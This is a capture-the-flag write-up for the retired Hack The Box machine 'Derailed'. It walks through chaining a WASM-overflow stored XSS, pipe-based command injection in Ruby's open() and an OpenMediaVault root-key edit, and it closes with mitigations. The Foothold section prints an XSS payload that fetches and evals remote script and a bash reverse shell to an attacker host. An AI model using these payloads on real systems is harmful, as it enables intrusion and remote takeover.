---
machine: Derailed
os: Linux
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [linux, web, rails, wasm, xss, command-injection, openmediavault, privesc]
---

# Derailed — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

A Rails application exposes its routes at `/rails/info/routes`. Registration does not limit the username length, and a buffer overflow in the WebAssembly module that renders the date overwrites the adjacent field, enabling stored XSS. The admin bot visits the note and the report form runs `open()` on an attacker-controlled name with a pipe, giving a shell as `rails`. `openmediavault-webgui`'s password opens the OpenMediaVault GUI, where a root SSH key can be written into its XML database.

## Recon

```bash
nmap -Pn -sCV -p22,3000 <IP>
```

- `22` OpenSSH and `3000` nginx 1.18 with Rails.
- The site is a note forum with registration and a report-to-admin button.
- `/rails/info/routes` leaks the route map in development.

## Enumeration

Review `/administration`, the report form and the application JavaScript. The WASM `display()` copies the username into a buffer and then writes the date at offset 48; a username of 48 bytes or more leaves the attacker's HTML in the date field, which is inserted unescaped.

## Foothold

Register a user whose name ends in an `<img onerror=...>` tag and publish a note. When it is reported, the administrator opens it and the browser runs the XSS. From there, read `/administration` and the report form.

The `report_log` field is passed to `open()` with a leading pipe; a value such as `|id` runs commands as `rails`.

```text
username: AAAA...(48 bytes)<img src='#' onerror="fetch('http://<IP>/x.js').then(r=>r.text()).then(eval)">
report_log: |bash -c 'bash -i >& /dev/tcp/<IP>/443 0>&1'
```

## Lateral movement

Credentials for `openmediavault-webgui` appear in the code and backups. The account has no SSH access, but `su` from `rails` works. A Chisel tunnel reaches the GUI on `localhost:80`.

## Privilege escalation

`omv-firstaid` resets the OpenMediaVault `admin` password because the panel maps it to the system account. OpenMediaVault's database is `/etc/openmediavault/config.xml`: add a public key to the `root` user under `sshpubkeys` and apply the change. Then log in over SSH as root.

```bash
# in the GUI: /sbin/omv-firstaid -> change the admin password
# edit <user><name>root</name><sshpubkeys>...
ssh-keygen -e -f id_ed25519.pub   # RFC 4716 format
```

## Evidence

- 48-byte username and an alert in the date field.
- Bot request to the XSS server.
- `open()` with a pipe in the report.
- `config.xml` with the root key and SSH access.

## Lessons learned

- Length limits are also a memory boundary in WASM.
- HTML built on the client can end up in the administrator's DOM.
- `open()` with user input is command injection.
- Appliances with an XML database allow persistent changes once their panel is compromised.

## Mitigation and detection

- Validate and cap length on the server, not only in the browser.
- Escape the date and never rebuild HTML from user data.
- Never pass filenames to `open()`; use allowlists and `File.open` without a pipe.
- Restrict the OpenMediaVault GUI and audit changes to `config.xml` and SSH keys.

## References

- [0xdf — Derailed](https://0xdf.gitlab.io/2023/07/22/htb-derailed.html)
- [IppSec — Derailed](https://www.youtube.com/watch?v=7CO4U1Y2Unk)
- [Hack The Box — Derailed](https://app.hackthebox.com/machines/derailed)
